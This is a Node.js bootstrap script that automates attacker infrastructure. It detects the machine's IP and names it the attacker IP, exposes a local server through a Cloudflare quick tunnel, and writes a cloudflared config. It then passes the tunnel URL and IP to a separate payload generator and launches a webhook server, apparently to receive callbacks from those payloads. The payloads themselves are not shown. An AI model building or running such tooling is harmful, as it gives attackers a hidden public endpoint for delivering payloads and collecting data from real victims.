// init.js — Fully Automated Bootstrap
const os = require('os');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');

// 1️⃣ Detect local IP
function getLocalIP() {
  const nets = os.networkInterfaces();
  for (let dev of Object.values(nets)) {
    for (let info of dev) {
      if (info.family === 'IPv4' && !info.internal) return info.address;
    }
  }
  throw new Error('Cannot detect local IP');
}

// 2️⃣ Launch Cloudflare Tunnel
function startCloudflared() {
  return new Promise((resolve, reject) => {
    const cf = spawn('cloudflared', ['tunnel', '--url', 'http://localhost:3000']);
    cf.stdout.on('data', data => {
      const line = data.toString();
      console.log('[cloudflared]', line.trim());
      const m = line.match(/https:\/\/[\w-]+\.trycloudflare\.com/);
      if (m) resolve({ process: cf, url: m[0] });
    });
    cf.stderr.on('data', d => console.error('[cloudflared][err]', d.toString()));
    cf.on('error', reject);
  });
}

// 3️⃣ Write cloudflared config (optional)
function writeCFConfig() {
  const cfg = `
tunnel: autogenerated
credentials-file: ./cloudflared/creds.json
ingress:
  - hostname: auto-generated
    service: http://localhost:3000
  - service: http_status:404
`.trim();
  fs.mkdirSync('cloudflared', { recursive: true });
  fs.writeFileSync('cloudflared/config.yml', cfg);
}

// 4️⃣ Generate payloads
async function buildPayloads(cfUrl, attackerIp) {
  require('./payloads/generate.js')(cfUrl, attackerIp);
}

// 5️⃣ Start Webhook Server
function startServer() {
  return spawn('node', ['server.js'], { stdio: 'inherit' });
}

(async () => {
  try {
    console.log('🔍 Detecting local IP…');
    const attackerIp = getLocalIP();
    console.log('✅ Found IP:', attackerIp);

    console.log('⚙️  Starting Cloudflare Tunnel…');
    const { process: cfProc, url: cfUrl } = await startCloudflared();
    console.log('✅ Public URL:', cfUrl);

    console.log('🛠️  Generating cloudflared config…');
    writeCFConfig();

    console.log('🎯 Building payloads…');
    await buildPayloads(cfUrl, attackerIp);

    console.log('🚀 Launching Webhook Server…');
    startServer();
  } catch (e) {
    console.error('❌ Bootstrap failed:', e);
    process.exit(1);
  }
})();
